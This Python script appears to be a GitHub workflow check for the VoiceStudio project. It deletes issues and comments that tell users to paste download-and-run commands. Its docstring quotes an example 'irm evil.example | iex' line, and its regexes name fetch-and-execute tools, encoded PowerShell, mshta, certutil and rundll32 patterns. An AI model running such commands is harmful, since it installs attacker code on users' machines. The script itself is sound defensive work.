#!/usr/bin/env python3
"""Remove malware commands posted in issues and comments.

Scammers open fake "[GUIDE] backend fix" issues (and reply to real bug reports)
telling people to paste a command such as `irm evil.example | iex` into
PowerShell. That command downloads a script from the scammer's site and runs
it. This check finds commands that download code and execute it in one step,
and removes them unless the download comes from a source the project's own
docs use (ALLOWED_SOURCES).

Runs from .github/workflows/scam-guard.yml on the default branch's copy of this
file. Standard library only.

A flagged issue has its title and body replaced, is labelled, closed and
locked; GitHub keeps the old text in the edit history, so a maintainer still
deletes the issue by hand. A flagged comment is deleted and the thread gets one
warning. Owners, members and collaborators are never checked. Logs name the
rule that matched, never the command.
"""
from __future__ import annotations

import json
import os
import re
import sys
import unicodedata
import urllib.error
import urllib.request
from dataclasses import dataclass

LABEL = "malware-removed"
WARNING_MARKER = "<!-- voicestudio-scam-guard -->"
TRUSTED_ASSOCIATIONS = {"OWNER", "MEMBER", "COLLABORATOR"}

# (host, path prefix) pairs that README/docs tell people to pipe into a shell.
ALLOWED_SOURCES = [
    ("voicestudio.sh", "/"),
    ("raw.githubusercontent.com", "/debpalash/VoiceStudio/"),
    ("github.com", "/debpalash/VoiceStudio/"),
    ("bun.sh", "/"),
    ("astral.sh", "/"),
    ("sh.rustup.rs", "/"),
]

ISSUE_TITLE = "Removed: malicious instructions"
ISSUE_BODY = f"""{WARNING_MARKER}
> [!CAUTION]
> This issue told people to run a command that downloads and runs a program from an unknown website. That is how malware gets installed, so the instructions were removed.
>
> **VoiceStudio maintainers never ask you to paste commands from an issue or comment.** Install and update VoiceStudio only from the [Releases page](https://github.com/debpalash/VoiceStudio/releases) or the commands in the README.
>
> If you already ran it: disconnect from the internet, run a full antivirus scan, and change passwords you use on that computer from a different device.
"""
COMMENT_WARNING = f"""{WARNING_MARKER}
> [!CAUTION]
> A comment on this thread told people to run a command that downloads and runs a program from an unknown website. It was removed because that is how malware gets installed.
>
> **VoiceStudio maintainers never ask you to paste commands from an issue or comment.** Install and update VoiceStudio only from the [Releases page](https://github.com/debpalash/VoiceStudio/releases) or the commands in the README.
"""


# ── Pure logic (unit-tested) ────────────────────────────────────────────

# Invisible characters scammers use to break up keywords.
_INVISIBLE = re.compile("[­​-‏⁠-⁤﻿]")
_FETCH = re.compile(
    r"\b(?:irm|iwr|invoke-restmethod|invoke-webrequest|curl(?:\.exe)?|wget|"
    r"downloadstring|downloadfile|start-bitstransfer)\b",
    re.I,
)
_EXECUTE = re.compile(
    r"\|\s*(?:iex|invoke-expression|(?:sudo\s+)?(?:ba|z|da)?sh|python3?|node|perl)\b"
    r"|\b(?:iex|invoke-expression)\s*[(\"'$]"
    r"|\b(?:ba|z)?sh\s+-c\s+[\"']?\$\("
    r"|\bstart-process\b",
    re.I,
)
# A host ends in an alphabetic TLD, so flags like --tlsv1.2 are not hosts.
# Group 1 is any userinfo: in https://voicestudio.sh@evil.example the host is evil.example.
_HOST = re.compile(r"(?:https?://)?([^\s/@'\"|;`]+@)?((?:[a-z0-9-]+\.)+[a-z]{2,})(/[^\s'\"|;)`]*)?", re.I)
# The download target comes before the pipe (or `;`) that hands it to the shell.
_TARGET_END = re.compile(r"[|;]")
# A download target we cannot vouch for: a variable or a bare IP address. Prose
# such as "the `irm | iex` command" or "`curl ... | sh`" names no target at all.
_HIDDEN_TARGET = re.compile(r"\$[a-z_{(]|\b\d{1,3}(?:\.\d{1,3}){3}\b", re.I)
# Commands that are dangerous whatever they point at.
_ALWAYS = [
    ("encoded-powershell", re.compile(r"\b(?:powershell|pwsh)(?:\.exe)?\b[^\n]*\s-e(?:nc?|ncodedcommand)?\s+[a-z0-9+/=]{16,}", re.I)),
    ("mshta", re.compile(r"\bmshta(?:\.exe)?\s+\S", re.I)),
    ("certutil-download", re.compile(r"\bcertutil(?:\.exe)?\b[^\n]*-urlcache", re.I)),
    ("rundll32-url", re.compile(r"\brundll32(?:\.exe)?\b[^\n]*https?://", re.I)),
]


@dataclass
class Finding:
    rule: str
    source: str | None = None  # the host a download-and-run command fetches


def normalise(text: str) -> str:
    return _INVISIBLE.sub("", unicodedata.normalize("NFKC", text or ""))


def allowed(host: str, path: str) -> bool:
    host = host.lower().removeprefix("www.")
    path = path or "/"
    if re.search(r"\.\.|%2e%2e|%2f|\\", path, re.I):  # could climb out of an allowed prefix
        return False
    return any(host == h and (path.lower() + "/").startswith(p.lower()) for h, p in ALLOWED_SOURCES)


def scan(text: str) -> list[Finding]:
    """Download-and-run commands from unlisted sources, plus always-bad commands."""
    text = normalise(text)
    findings = [Finding(rule) for rule, pattern in _ALWAYS if pattern.search(text)]
    for line in re.split(r"[\r\n]+", text):
        if not _EXECUTE.search(line):
            continue
        fetches = list(_FETCH.finditer(line))
        for i, fetch in enumerate(fetches):
            end = fetches[i + 1].start() if i + 1 < len(fetches) else len(line)
            pipe = _TARGET_END.search(line, fetch.end(), end)
            end = pipe.start() if pipe else end
            # curl and wget take several URLs, so every host in the target must be allowed.
            hosts = list(_HOST.finditer(line, fetch.end(), end))
            if not hosts:
                if _HIDDEN_TARGET.search(line, fetch.end(), end):
                    findings.append(Finding("download-and-run"))
                continue
            bad = next((h for h in hosts if h.group(1) or not allowed(h.group(2), h.group(3))), None)
            if bad:
                findings.append(Finding("download-and-run", bad.group(2).lower()))
    return findings


def describe(findings: list[Finding]) -> str:
    return ", ".join(f"{f.rule} ({f.source})" if f.source else f.rule for f in findings)


# ── GitHub API ──────────────────────────────────────────────────────────


class GitHub:
    def __init__(self, token: str, repo: str, api: str = "https://api.github.com"):
        self.token, self.repo, self.api = token, repo, api.rstrip("/")

    def request(self, method: str, path: str, body: dict | None = None) -> tuple[int, object]:
        data = json.dumps(body).encode() if body is not None else None
        req = urllib.request.Request(f"{self.api}{path}", data=data, method=method)
        req.add_header("Authorization", f"Bearer {self.token}")
        req.add_header("Accept", "application/vnd.github+json")
        req.add_header("X-GitHub-Api-Version", "2022-11-28")
        try:
            with urllib.request.urlopen(req, timeout=30) as resp:
                raw = resp.read()
                return resp.status, json.loads(raw) if raw else None
        except urllib.error.HTTPError as err:
            raw = err.read()
            try:
                return err.code, json.loads(raw) if raw else None
            except ValueError:
                return err.code, None

    def call(self, method: str, path: str, body: dict | None = None, ok: tuple[int, ...] = (200, 201, 204)) -> object:
        status, payload = self.request(method, path, body)
        if status not in ok:
            raise RuntimeError(f"{method} {path} failed with {status}: {payload}")
        return payload


def remove_issue(gh: GitHub, number: int) -> None:
    base = f"/repos/{gh.repo}/issues/{number}"
    gh.call("PATCH", base, {"title": ISSUE_TITLE, "body": ISSUE_BODY,
                            "state": "closed", "state_reason": "not_planned"})
    gh.call("POST", f"{base}/labels", {"labels": [LABEL]})
    # 422 when the issue is already locked.
    gh.call("PUT", f"{base}/lock", {"lock_reason": "spam"}, ok=(204, 422))


def remove_comment(gh: GitHub, number: int, comment_id: int) -> None:
    gh.call("DELETE", f"/repos/{gh.repo}/issues/comments/{comment_id}", ok=(204, 404))
    comments = gh.call("GET", f"/repos/{gh.repo}/issues/{number}/comments?per_page=100")
    if not any(WARNING_MARKER in (c.get("body") or "") for c in comments):
        gh.call("POST", f"/repos/{gh.repo}/issues/{number}/comments", {"body": COMMENT_WARNING})
    gh.call("POST", f"/repos/{gh.repo}/issues/{number}/labels", {"labels": [LABEL]})


def run(gh: GitHub, event_name: str, event: dict) -> str:
    """Checks the event's issue or comment; returns what happened, for the log."""
    issue = event["issue"]
    target = event["comment"] if event_name == "issue_comment" else issue
    who = target["user"]["login"]
    if target.get("author_association") in TRUSTED_ASSOCIATIONS or target["user"].get("type") == "Bot":
        return f"#{issue['number']}: skipped trusted author {who}"
    text = target.get("body") or ""
    if target is issue:
        text = f"{issue.get('title') or ''}\n{text}"
    findings = scan(text)
    if not findings:
        return f"#{issue['number']}: clean"
    if target is issue:
        remove_issue(gh, issue["number"])
        return f"#{issue['number']}: removed issue by {who}: {describe(findings)}"
    remove_comment(gh, issue["number"], target["id"])
    return f"#{issue['number']}: removed comment {target['id']} by {who}: {describe(findings)}"


def main() -> int:
    with open(os.environ["GITHUB_EVENT_PATH"], encoding="utf-8") as handle:
        event = json.load(handle)
    gh = GitHub(os.environ["GITHUB_TOKEN"], os.environ["GITHUB_REPOSITORY"],
                os.environ.get("GITHUB_API_URL", "https://api.github.com"))
    print("Scam guard:", run(gh, os.environ["GITHUB_EVENT_NAME"], event))
    return 0


if __name__ == "__main__":
    sys.exit(main())
